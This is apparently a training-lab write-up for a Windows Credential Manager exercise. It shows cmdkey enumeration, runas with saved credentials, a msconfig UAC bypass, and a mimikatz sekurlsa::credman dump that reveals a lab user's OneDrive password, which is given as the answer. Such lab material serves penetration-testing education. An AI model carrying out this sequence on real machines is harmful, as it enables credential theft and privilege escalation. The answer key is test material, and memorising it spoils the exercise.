# Section 13: Attacking Windows Credential Manager

Module: 10. Password Attacks

---

## Questions & Answers

### 1. What is the password mcharles uses for OneDrive?

Context:
```powershell
PS C:\Users\sadams> cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles

PS C:\Users\sadams> runas /savecred /user:SRV01\mcharles cmd
Attempting to start cmd as user "SRV01\mcharles" ...
```
```powershell
C:\Windows\system32>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02jejfxhvabjneqt
    Local machine persistence

    Target: LegacyGeneric:target=onedrive.live.com
    Type: Generic
    User: mcharles@inlanefreight.local


C:\Windows\system32>msconfig UAC bypass
```
Go to `Tools > Command Prompt` to launch a command prompt with administrator privileges.
```bash
C:\Users\Administrator>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

Authentication Id : 0 ; 749728 (00000000:000b70a0)
Session           : Interactive from 0
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 8/4/2026 8:28:59 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : Inlanefreight#2025

Authentication Id : 0 ; 400009 (00000000:00061a89)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/4/2026 8:23:50 AM
SID               : S-1-5-90-0-2
        credman :

Authentication Id : 0 ; 68858 (00000000:00010cfa)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/4/2026 8:14:44 AM
SID               : S-1-5-90-0-1
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SRV01$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 8/4/2026 8:14:43 AM
SID               : S-1-5-20
        credman :

Authentication Id : 0 ; 39551 (00000000:00009a7f)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 8/4/2026 8:14:42 AM
SID               : S-1-5-96-0-0
        credman :

Authentication Id : 0 ; 38445 (00000000:0000962d)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 8/4/2026 8:14:42 AM
SID               :
        credman :

Authentication Id : 0 ; 749697 (00000000:000b7081)
Session           : Interactive from 0
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 8/4/2026 8:28:59 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : Inlanefreight#2025
```

**Answer:** `Inlanefreight#2025`

---

[Back to Module Index](./README.md)
